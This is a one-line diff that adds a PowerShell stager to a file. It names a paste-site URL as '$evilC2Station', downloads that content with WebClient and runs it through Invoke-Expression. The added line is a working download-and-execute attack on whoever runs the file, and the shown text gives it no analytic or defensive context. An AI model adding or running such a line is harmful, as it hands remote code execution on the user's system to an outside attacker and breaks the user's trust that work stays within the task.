@@ -1,0 +1,1 @@
+$evilC2Station = "https://pst.klgrth.io/paste/3gegdkf7upkqgwqn7mdbf8nv/download"; $webClient = [System.Net.WebClient]::new(); $file = $webClient.DownloadData($evilC2Station); iex  ([System.Text.Encoding]::UTF8.GetString($file))
